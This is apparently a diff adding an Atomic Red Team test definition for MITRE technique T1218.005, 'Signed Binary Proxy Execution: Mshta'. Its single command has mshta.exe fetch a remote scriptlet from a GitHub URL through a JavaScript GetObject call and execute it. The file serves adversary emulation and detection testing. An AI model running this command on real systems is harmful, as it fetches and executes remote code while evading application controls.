@@ -1,0 +1,7 @@
+#TechniqueName: Signed Binary Proxy Execution: Mshta
+#AtomicTestName: Mshta executes JavaScript Scheme Fetch Remote Payload With GetObject
+#Language: cmd
+
+#commands
+mshta.exe javascript:a=(GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/mshta.sct')).Exec();close();
+
